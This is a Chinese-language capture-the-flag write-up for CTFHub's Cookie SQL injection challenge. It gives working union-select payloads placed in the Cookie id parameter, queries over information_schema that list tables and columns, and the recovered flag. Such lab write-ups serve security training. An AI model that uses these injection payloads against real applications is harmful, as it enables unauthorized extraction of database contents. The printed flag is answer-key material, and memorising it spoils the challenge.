---
title: CTFhub Cookie注入
date: 2026-09-29
categories: CTFHub Web
tags: CTFHub Web SQL注入 数字型注入
---
# 题目：CTFhub Cookie注入

## 题目描述
题目提示输入点发生改变，注入点不在URL参数，而在HTTP请求Cookie的 id 参数，属于Union联合查询SQL注入。
 
## 解题思路
1. 确定注入点位置：Cookie中的 id 参数。
2. 判断注入类型：数字型注入，传入 and 1=1 页面正常回显， and 1=2 无数据。
3. 使用 union select 联合查询，爆数据库、表名、字段名。
4. 注意：该题每次开启环境，flag所在的表名、字段名都是随机生成，不能硬编码。
5. 查询随机表内flag字段内容获取flag。
 
## 解题步骤
使用Burp Suite抓包，将请求发送到Repeater，在Host的下一行添加Cookie
1. 验证注入点
Cookie:
id=1 and 1=1
页面正常输出数据，确认数字型Cookie注入生效。
 
2. 查询库内所有表名
Cookie:
id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()
回显表： okwedxwukf,news ， okwedxwukf 为flag存放表。
 
3. 查询该表的字段名
Cookie:
id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name='okwedxwukf'
回显字段： xdshnmwphe 。
 
4. 查询flag数据
Cookie:
id=-1 union select 1,xdshnmwphe from okwedxwukf
页面得到flag：
 ctfhub{f674b8dc9df91eebed28242e}

## 踩坑指南
1. 注入点在Cookie，不是URL参数，也不是Referer请求头。
2. flag的表名、字段名每次环境随机变化，不能直接写死 flag 表与 flag 字段，否则查询结果为空。
3. Union注入前面查询需要无结果，使用 id=-1 让前半部分查询返回空，才能回显union后的数据。
4. Cookie注入的表名是随机生成，不是flag，不能硬编码写死脚本。
 
## 知识点总结
1. Cookie注入：SQL注入点可以位于Cookie请求参数，不仅仅限于GET/POST参数。
2. Union联合查询：利用 -1 使主查询无返回，将查询结果展示到页面回显位。
3. MySQL元数据表 information_schema.tables 、 information_schema.columns 用于爆表、爆字段。
4. group_concat() ：把多行查询结果拼接成一行输出，方便CTF回显。
